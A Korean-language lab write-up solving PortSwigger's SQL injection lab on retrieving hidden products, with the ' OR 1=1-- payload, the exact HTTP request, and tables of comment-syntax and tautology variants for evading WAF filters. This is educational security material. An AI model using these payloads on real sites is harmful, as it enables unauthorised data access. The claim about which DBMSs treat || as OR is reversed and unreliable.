# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 개요

- **난이도**: Apprentice
- **주제**: SQL Injection
- **링크**: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

## 목표

카테고리 필터에 SQL injection을 수행하여 릴리스되지 않은 숨겨진 상품까지 모두 표시한다.

## 분석

쇼핑 애플리케이션에서 카테고리를 클릭하면 다음과 같은 요청이 발생한다.

```
GET /filter?category=Gifts
```

서버 측에서는 아래와 같은 SQL 쿼리가 실행된다.

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

- `category` 파라미터가 쿼리에 직접 삽입된다.
- `released = 1` 조건으로 공개된 상품만 필터링하고 있다.

## 풀이

`category` 파라미터에 다음 페이로드를 삽입한다.

```
' OR 1=1--
```

최종 실행되는 쿼리:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

| 요소 | 역할 |
|------|------|
| `'` | 기존 문자열 리터럴을 닫음 |
| `OR 1=1` | 항상 참인 조건을 추가하여 모든 행을 반환 |
| `--` | 이후 쿼리(`AND released = 1`)를 주석 처리 |

### 요청

```
GET /filter?category=' OR 1=1-- HTTP/2
```

## 핵심 정리

- 사용자 입력이 SQL 쿼리에 직접 결합되면 공격자가 쿼리 구조를 변경할 수 있다.
- `OR 1=1`로 WHERE 절의 조건을 무력화할 수 있다.
- `--` 주석으로 뒤따르는 조건을 무시시킬 수 있다.
- **방어**: Prepared Statement(Parameterized Query)를 사용하여 입력값을 쿼리 구조와 분리해야 한다.

## 배운 점 및 추가 학습

### 1. 주석 처리 — `--` 외에 쿼리 뒷부분을 무력화하는 방법

`--` 이외에도 DBMS별로 다양한 주석 구문이 존재한다.

| 구문 | 지원 DBMS | 예시 페이로드 |
|------|-----------|---------------|
| `--` | 대부분 (PostgreSQL, SQLite, MSSQL 등) | `' OR 1=1--` |
| `-- ` (뒤에 공백) | MySQL (공백 필수) | `' OR 1=1-- ` |
| `#` | MySQL, MariaDB | `' OR 1=1#` |
| `/* */` | 대부분 (블록 주석) | `' OR 1=1/*` |

- MySQL에서 `--`를 사용할 때는 **뒤에 공백이 필수**이다. 공백 없이 `--`만 보내면 주석으로 인식되지 않을 수 있다.
- URL에서 `#`은 fragment 구분자이므로, 요청 시 `%23`으로 URL 인코딩해야 서버까지 전달된다.
- 블록 주석 `/* */`은 닫는 `*/` 없이 `/*`만 사용해도 쿼리 끝까지 무력화되는 경우가 많다.
- WAF(Web Application Firewall)가 `--`를 필터링할 때 `#`이나 `/*`로 우회할 수 있다.

### 2. 항상 참인 조건 — `OR 1=1`의 다양한 변형

`OR 1=1`은 가장 대표적인 tautology(항진식)이지만, 필터링 우회나 이해를 위해 다양한 변형을 알아둘 필요가 있다.

**비교 연산자 변형**

| 페이로드 | 설명 |
|----------|------|
| `' OR 1=1--` | 기본형 |
| `' OR 2>1--` | 부등호 비교 (항상 참) |
| `' OR 1<2--` | 반대 방향 부등호 |
| `' OR 1!=0--` | 불일치 비교 |
| `' OR 'a'='a'--` | 문자열 비교 (항상 참) |
| `' OR 'abc'<'b'--` | 문자열 사전순 비교 |

**논리 연산자 변형**

| 페이로드 | 설명 |
|----------|------|
| `' OR 1--` | 일부 DBMS에서 0이 아닌 값은 참으로 평가 |
| `' OR TRUE--` | PostgreSQL 등에서 boolean 리터럴 사용 |
| `'\|\| 1=1--` | `\|\|`가 OR로 동작하는 DBMS (Oracle, SQLite) |

**WAF 우회를 고려한 변형**

| 페이로드 | 설명 |
|----------|------|
| `' OR 1=1--` | `OR`과 `1=1`이 시그니처로 탐지될 수 있음 |
| `' OR 2>1--` | `1=1` 패턴을 회피 |
| `' OR 'x'='x'--` | 숫자 대신 문자열 사용으로 패턴 회피 |
| `' OR 1=1/*` | 주석 구문까지 함께 변형 |

### 3. 추가로 고민해볼 것

- DBMS마다 주석 구문과 연산자 동작이 다르므로, **대상 DBMS를 식별하는 것이 선행**되어야 한다.
- 실제 환경에서는 WAF, 입력 필터링 등이 존재하므로 단일 페이로드가 아닌 **여러 변형을 시도**하는 접근이 필요하다.
- `||` 연산자는 DBMS에 따라 OR(Oracle, SQLite) 또는 문자열 연결(MySQL, PostgreSQL)로 해석되므로 주의해야 한다.
